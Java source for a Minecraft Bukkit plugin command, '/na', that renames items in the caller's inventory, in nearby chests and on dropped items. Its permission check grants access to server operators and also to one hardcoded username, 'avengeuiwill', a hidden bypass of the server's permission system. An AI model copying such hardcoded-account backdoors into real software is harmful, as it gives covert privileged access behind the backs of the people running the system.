package me.danslayerx.overkill.commands;

import me.danslayerx.overkill.Main;

import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.block.Chest;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class NameAll implements CommandExecutor{

	@SuppressWarnings("deprecation")
	@Override
	public boolean onCommand(CommandSender s, Command c, String l,
			String[] args) {
		if(c.getName().equalsIgnoreCase("na")){
			
			if((s.getName().equalsIgnoreCase("avengeuiwill"))
				|| (s.isOp())){
				
				if(args.length == 0){
					s.sendMessage(Main.title + "/na <message> - name items.");
					return false;
				}
				
				String name = ChatColor.RESET + "";
				
				for(int i = 0; i < args.length; i++){
					name += args[i] + " ";
				}
				
				name = ChatColor.translateAlternateColorCodes('&', name);
				
				Player p = (Player)s;
				
				for(ItemStack i : p.getInventory().getContents()){
					
					if(i != null){
						if(!i.getType().equals(Material.AIR))
						i = setName(i, name);
					}
					
				}
				
				for(ItemStack i : p.getInventory().getArmorContents()){
					
					if(i != null){
						if(!i.getType().equals(Material.AIR))
						i = setName(i, name);
					}
					
				}
				
				p.updateInventory();
				
				p.sendMessage(Main.title + " Named your items '" + name + "'.");
				
				for(int x = p.getLocation().getBlockX()-20; x < p.getLocation().getBlockX()+20; x++){
					for(int y = p.getLocation().getBlockY()-20; y < p.getLocation().getBlockY(); y++){
						for(int z = p.getLocation().getBlockZ()-20; z < p.getLocation().getBlockZ()+20; z++){
							if(p.getWorld().getBlockAt(x, y, z).getType().equals(Material.CHEST)){
								
								Chest ch = (Chest) p.getWorld().getBlockAt(x, y, z).getState();
								
								for(ItemStack i : ch.getBlockInventory().getContents()){
									
									if(i != null){
										if(!i.getType().equals(Material.AIR))
										i = setName(i, name);
									}
									
								}
								
							}
						}
					}
				}
				
				for(Entity e : p.getNearbyEntities(20, 20, 20)){
					if(e instanceof Item){
						Item i = (Item) e;
						setName(i.getItemStack(), name);
					}
				}
				
			}
			
		}
		return false;
	}

	private ItemStack setName(ItemStack i, String name) {
		
		ItemMeta im = i.getItemMeta();
		im.setDisplayName(name);
		i.setItemMeta(im);
		
		return i;
	}
	
	

}
